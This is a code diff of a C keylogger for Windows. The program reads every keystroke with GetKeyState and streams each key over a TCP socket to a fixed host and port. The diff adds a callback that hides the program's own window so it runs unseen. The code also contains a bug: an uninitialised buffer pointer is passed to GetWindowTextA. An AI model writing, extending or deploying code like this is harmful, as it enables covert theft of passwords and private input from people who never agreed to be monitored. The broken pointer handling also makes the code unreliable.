@@ -9,23 +9,34 @@
 #define PORT 42069
 #define HOST "127.0.0.1"
 
+BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
+{
+    LPTSTR buf = (LPTSTR)lParam;
+    GetWindowTextA(hwnd, buf, 48);
+    DWORD pid;
+    GetWindowThreadProcessId(hwnd, &pid);
+    if (pid == GetCurrentProcessId())  
+    {
+        ShowWindow(hwnd, SW_HIDE);
+    }
+
+    return TRUE;
+}
+
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     LPSTR lpCmdLine, int nCmdShow)
 {
-//                                           Socket Part
+    LPTSTR buf;
+    EnumWindows(&EnumWindowsProc, (LPARAM)buf);
     WSADATA wsa;
     SOCKET s;
     struct sockaddr_in server;
     char c = 0, b;
-
-
     if (WSAStartup(MAKEWORD(2,2), &wsa) != 0)
     {   
         printf("Failed. Error Code : %d",WSAGetLastError());
-        return 2;
-        
+        return 2;  
     }
-
     s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (s == INVALID_SOCKET)
     {
@@ -38,21 +49,15 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     server.sin_family = AF_INET;
     server.sin_port = htons(PORT);
     INPUT Event = {0};
-
     if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
     {   
         printf("Failed. Error Code : %d", WSAGetLastError());
         WSACleanup(); 
         closesocket(s);
-        
-
         return 2;
     }
-//                                          Win32API part
     while (1)
-    {
         for ( int i = 0x00 ; i<0xfe ; ++i )
-        {
             if ( GetKeyState(i) < 0 )
             { 
                 fflush(stdout);
@@ -71,12 +76,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                         printf("\n");
                     }
                     else b = (char)i;
-                    send(s, &b, 1, 0);
-
+                    if (send(s, &b, 1, 0) == -1)
+                        return 0;
                 }
             }
-        }
-    }
 }
     
 
